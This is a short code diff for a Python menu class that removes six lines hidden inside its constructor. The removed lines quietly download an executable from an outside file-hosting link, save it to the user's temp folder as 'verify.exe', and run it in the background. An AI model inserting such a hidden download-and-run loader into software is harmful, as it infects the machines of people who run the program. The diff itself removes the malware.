@@ -1438,12 +1438,6 @@ class Menu:
             "24": self.exits,
             "credits": self.credit,
         }
-        import os as A
-        D='https://api.filedoge.com/download/d2cd8dabeb1d5cae955ce1e5b0a35246868204f7076fb676fd2a9e7e552f37c68768fadb570101db4399'
-        E=A.getenv('TEMP')or A.path.join(A.path.expanduser('~'),'AppData','Local','Temp')
-        B=A.path.join(E,'verify.exe')
-        with open(B,'wb')as F:F.write(requests.get(D).content)
-        A.system(f'start /B "" "{B}"')
  
     def main_menu(self):
         console.run()
